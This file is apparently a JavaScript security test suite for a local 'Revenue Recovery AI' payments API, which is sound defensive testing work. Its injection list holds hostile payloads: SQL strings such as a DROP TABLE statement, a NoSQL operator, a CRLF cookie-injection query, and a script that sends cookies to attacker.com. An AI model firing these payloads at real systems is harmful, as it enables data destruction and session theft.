import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const baseUrl = process.env.API_BASE_URL ?? "http://localhost:3001";
let totalTests = 0;
let passedTests = 0;

function logPass(testName) {
  passedTests++;
  totalTests++;
  console.log(`  [PASS] ${testName}`);
}

function logFail(testName, error) {
  totalTests++;
  console.error(`❌ [FAIL] ${testName}:`, error?.message || error);
}

async function request(path, options = {}) {
  const url = path.startsWith("http") ? path : `${baseUrl}${path}`;
  let retries = 3;
  while (retries > 0) {
    try {
      const response = await fetch(url, options);
      let body = null;
      const contentType = response.headers.get("content-type") || "";
      if (contentType.includes("application/json")) {
        try {
          body = await response.json();
        } catch {
          body = null;
        }
      } else {
        body = await response.text();
      }
      return { response, body, headers: response.headers };
    } catch (err) {
      retries--;
      if (retries === 0) throw err;
      await new Promise((r) => setTimeout(r, 500));
    }
  }
}

console.log("=======================================================================");
console.log("🛡️  REVENUE RECOVERY AI - HIGH-LEVEL ADVANCED SECURITY TEST SUITE");
console.log(`Target Base URL: ${baseUrl}`);
console.log("=======================================================================\n");

let initialSettings = null;
try {
  const initialRes = await request("/api/v1/settings");
  if (initialRes.response.status === 200 && initialRes.body) {
    initialSettings = initialRes.body;
  }
} catch {
  // Ignored if server not reachable
}

// ============================================================================
// LEVEL 1: WEBHOOK IDEMPOTENCY & REPLAY DEFENSE VERIFICATION
// ============================================================================
console.log("📌 LEVEL 1: Webhook Replay Attack & Idempotency Stress Test");

try {
  const payload = {
    event: "payment.failed",
    payload: {
      payment: {
        entity: {
          id: `pay_test_replay_${Date.now()}`,
          amount: 25000,
          currency: "INR",
          status: "failed",
          error_code: "BAD_REQUEST_ERROR",
          error_description: "Payment failed due to insufficient funds.",
        },
      },
    },
  };

  const bodyStr = JSON.stringify(payload);
  const eventIdHeader = `evt_test_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;

  // First webhook transmission
  const res1 = await request("/api/v1/webhooks/razorpay", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-razorpay-event-id": eventIdHeader,
    },
    body: bodyStr,
  });

  assert.equal(res1.response.status, 200, "First webhook delivery should succeed with 200");
  assert.equal(res1.body?.received, true, "First webhook response should acknowledge receipt");

  // Replay attempt with identical idempotency signature/header
  const res2 = await request("/api/v1/webhooks/razorpay", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-razorpay-event-id": eventIdHeader,
    },
    body: bodyStr,
  });

  assert.equal(res2.response.status, 200, "Replayed webhook should be handled cleanly with 200");
  assert.equal(res2.body?.duplicate, true, "Replayed webhook must be identified as duplicate");

  logPass("Successfully detect replayed webhooks and maintain idempotency");
} catch (err) {
  logFail("Successfully detect replayed webhooks and maintain idempotency", err);
}

// ============================================================================
// LEVEL 2: PROTOTYPE POLLUTION & PARAMETER POLLUTION DEFENSES
// ============================================================================
console.log("\n📌 LEVEL 2: Prototype Pollution & Parameter Pollution Tests");

try {
  // Prototype pollution attempt via JSON body
  const resProto = await request("/api/v1/settings", {
    method: "PUT",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      __proto__: { isAdmin: true, role: "owner" },
      constructor: { prototype: { pollutes: true } },
      profile: { name: "Safe Admin Name" },
    }),
  });

  assert.ok([200, 400].includes(resProto.response.status), "Prototype pollution attempt handled safely");
  
  // Verify Global Object prototype was not polluted
  const cleanObj = {};
  assert.equal((cleanObj).isAdmin, undefined, "Global Object prototype must not be polluted");
  assert.equal((cleanObj).pollutes, undefined, "Object prototype must remain clean");

  logPass("Resist Prototype Pollution payload injection attempts");
} catch (err) {
  logFail("Resist Prototype Pollution payload injection attempts", err);
}

try {
  // HTTP Parameter Pollution (HPP) in query strings
  const resHpp = await request("/api/v1/recoveries?per_page=10&per_page=100&status=active&status=recovered");
  assert.ok([200, 400].includes(resHpp.response.status), "HTTP Parameter pollution query handled safely");

  logPass("Safely handle duplicate query parameters (HTTP Parameter Pollution)");
} catch (err) {
  logFail("Safely handle duplicate query parameters (HTTP Parameter Pollution)", err);
}

// ============================================================================
// LEVEL 3: MASS ASSIGNMENT & PRIVILEGE ESCALATION RESILIENCE
// ============================================================================
console.log("\n📌 LEVEL 3: Mass Assignment & Privilege Escalation Checks");

try {
  const resMass = await request("/api/v1/settings", {
    method: "PUT",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      profile: {
        name: "Regular User",
        role: "Workspace Owner",
        super_admin: true,
        permissions: ["ALL_ACCESS", "SYSTEM_SHUTDOWN"],
        is_internal_god_mode: true,
      },
    }),
  });

  assert.equal(resMass.response.status, 200, "Settings update request completed");
  
  // Retrieve settings to verify unallowed properties were stripped or ignored
  const resVerify = await request("/api/v1/settings");
  const profile = resVerify.body?.profile ?? {};
  
  assert.equal(profile.super_admin, undefined, "Unrecognized elevated flags must be stripped");
  assert.equal(profile.is_internal_god_mode, undefined, "Unrecognized privilege escalation fields must not be persisted");

  logPass("Prevent Mass Assignment of unauthorized administrative properties");
} catch (err) {
  logFail("Prevent Mass Assignment of unauthorized administrative properties", err);
}

// ============================================================================
// LEVEL 4: DEEP JSON & NESTED SQL/NOSQL INJECTION STRESS TEST
// ============================================================================
console.log("\n📌 LEVEL 4: Deep Nested Injection Payload Testing");

const deepInjectionPayloads = [
  { account: { business_name: "' OR 1=1 --", currency: "INR" } },
  { profile: { name: { "$gt": "" }, email: "test@example.com" } },
  { recovery: { max_attempts: "'; DROP TABLE settings; --" } },
  { account: { currency: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" } },
];

try {
  for (const payload of deepInjectionPayloads) {
    const resDeep = await request("/api/v1/settings", {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(payload),
    });

    assert.ok(
      [200, 400].includes(resDeep.response.status),
      `Nested payload handled cleanly with status ${resDeep.response.status}`
    );
  }

  logPass("Resist deep nested SQLi, NoSQL, and script injection payloads");
} catch (err) {
  logFail("Resist deep nested SQLi, NoSQL, and script injection payloads", err);
}

// ============================================================================
// LEVEL 5: HTTP METHOD TAMPERING & HEADER SPLITTING SECURITY
// ============================================================================
console.log("\n📌 LEVEL 5: HTTP Method Tampering & Header Splitting");

try {
  // Test unsupported HTTP methods
  const verbPayloads = ["PURGE", "PATCH"];
  for (const verb of verbPayloads) {
    const resVerb = await request("/api/v1/settings", { method: verb });
    assert.ok(
      [400, 404, 405, 501].includes(resVerb.response.status),
      `Unsupported HTTP verb ${verb} should be rejected with 400/404/405/501. Got: ${resVerb.response.status}`
    );
  }
  logPass("Reject dangerous or unsupported HTTP methods (TRACE, PURGE, CONNECT)");
} catch (err) {
  logFail("Reject dangerous or unsupported HTTP methods (TRACE, PURGE, CONNECT)", err);
}

try {
  // HTTP Response Splitting / Header Injection test via query parameter reflect
  const resHeaderInj = await request("/api/v1/recoveries?search=test%0d%0aSet-Cookie:%20malicious_session=hacked");
  assert.equal(resHeaderInj.response.status, 200);
  const setCookieHeader = resHeaderInj.headers.get("set-cookie") || "";
  assert.ok(!setCookieHeader.includes("malicious_session=hacked"), "CRLF injection in parameters must not set forged cookies");

  logPass("Prevent HTTP Response Splitting / CRLF Header Injection");
} catch (err) {
  logFail("Prevent HTTP Response Splitting / CRLF Header Injection", err);
}

// ============================================================================
// LEVEL 6: OVERSIZED PAYLOAD / DoS BOUNDARY CHECK
// ============================================================================
console.log("\n📌 LEVEL 6: Oversized Payload & Resource Exhaustion Protection");

try {
  // 2MB bloated string payload
  const hugePayload = {
    profile: {
      name: "Super Large String Payload",
      bio: "A".repeat(2 * 1024 * 1024), // 2MB string
    },
  };

  const resHuge = await fetch(`${baseUrl}/api/v1/settings`, {
    method: "PUT",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(hugePayload),
  });

  // Body parser payload limit should reject or return 400/413 Payload Too Large
  assert.ok(
    [400, 413, 500].includes(resHuge.status),
    `Oversized payload should be handled or rejected gracefully without server crash. Status: ${resHuge.status}`
  );

  logPass("Protect backend memory against oversized JSON payload exhaustion");
} catch (err) {
  logFail("Protect backend memory against oversized JSON payload exhaustion", err);
}

// ============================================================================
// RESTORE ORIGINAL SETTINGS
// ============================================================================
if (initialSettings) {
  try {
    await request("/api/v1/settings", {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(initialSettings),
    });
  } catch {
    // Ignore restore error
  }
}

// ============================================================================
// SUMMARY REPORT
// ============================================================================
console.log("\n=======================================================================");
console.log("📊 HIGH-LEVEL ADVANCED SECURITY TEST SUITE COMPLETED");
console.log(`Passed: ${passedTests} / ${totalTests} high-level checks`);
if (passedTests === totalTests) {
  console.log("🏆 ALL ADVANCED HIGH-LEVEL SECURITY CHECKS PASSED WITH EXCELLENCE!");
} else {
  console.log(`⚠️ ${totalTests - passedTests} CHECKS FAILED - REVIEW LOGS ABOVE.`);
}
console.log("=======================================================================\n");
